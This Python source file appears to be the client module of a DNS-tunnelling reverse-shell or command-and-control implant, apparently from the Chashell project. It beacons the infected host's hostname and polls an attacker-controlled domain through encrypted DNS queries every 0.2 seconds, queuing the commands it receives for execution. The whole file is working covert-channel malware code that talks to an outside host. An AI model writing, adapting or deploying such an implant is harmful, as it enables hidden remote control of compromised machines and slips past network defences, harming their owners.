import time
import socket
from lib.protocol import chacomm_pb2
from lib.transport.encoding import dns_marshal, decode
from lib.transport.dns import send_dns_query

def poll_read(stream):
    send_info_packet(stream)
    loop_counter = 0
    while True:
        time.sleep(0.2)
        poll(stream)
        loop_counter += 1
        if loop_counter % 300 == 0:
            send_info_packet(stream)

def poll(stream):
    poll_query = chacomm_pb2.Message(
        clientguid=stream.client_guid,
        pollquery=chacomm_pb2.PollQuery()
    )
    poll_packet = dns_marshal(poll_query, stream.encryption_key, True)
    answers = send_dns_query(poll_packet.encode(), stream.target_domain)
    if len(answers) > 0:
        packet_data = ''.join(answers)
        if packet_data == "-": return
        output, complete = decode(packet_data, stream.encryption_key)
        if complete:
            stream.packet_queue.put(output)
        else:
            poll(stream)

def send_info_packet(stream):
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"
    info_query = chacomm_pb2.Message(
        clientguid=stream.client_guid,
        infopacket=chacomm_pb2.InfoPacket(hostname=hostname.encode())
    )
    poll_packet = dns_marshal(info_query, stream.encryption_key, True)
    send_dns_query(poll_packet.encode(), stream.target_domain)
